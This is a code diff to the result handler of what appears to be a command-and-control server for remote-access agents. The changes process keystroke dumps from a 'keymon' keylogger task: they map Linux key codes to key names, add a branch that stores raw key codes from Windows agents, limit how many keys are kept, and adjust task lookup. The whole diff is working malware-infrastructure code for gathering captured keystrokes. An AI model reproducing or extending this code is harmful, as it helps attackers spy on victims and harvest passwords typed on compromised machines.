@@ -228,14 +228,14 @@ export const setResult = async (agentID, data) => {
   result = result.toString();
   const socketServer = global.socketServer;
   const agent = await getAgent(agentID);
-  const task = await Task.findOne({uid: taskID.toString()});
-  if (!(task && task.completed === false))
+  const task = await Task.findOne({uid: taskID.toString(), completed: false});
+  if (!task)
     throw new Error("Invalid task!");
   task.completed = true;
   task.successful = successful;
   task.dateCompleted = Date.now();
-  if (task.taskType === "keymon"){
-    task.result = "";
+  task.result = "";
+  if (task.taskType === "keymon" && agent.os === "linux"){
     // Parse main keyboard dumps.
     let keys = data["main-kbd"];
     if (keys){
@@ -309,7 +309,7 @@ export const setResult = async (agentID, data) => {
         mapping[108] = "[DOWN]";
         mapping[109] = "[PG-DOWN]";
         mapping[110] = "[INSERT]";
-        for (let i = 0; i < keys.length; i++){
+        for (let i = 0; i < keys.length && i < global.KEYMON_MAX_KEYS; i++){
           let val = mapping[parseInt(keys[i])];
           if (!val)
             val = keys[i].toString();
@@ -341,6 +341,13 @@ export const setResult = async (agentID, data) => {
         }
         result += "\n\n";
         task.result += result;
+      }
+    }
+  }else if (task.taskType === "keymon" && agent.os === "windows"){
+    if (data["main-kbd"]){
+      for (let i = 0; i < data["main-kbd"].length && i < global.KEYMON_MAX_KEYS; i++){
+        let keyCode = data["main-kbd"][i];
+        task.result += `${keyCode} `;
       }
     }
   }else if (task.taskType === "cd"){
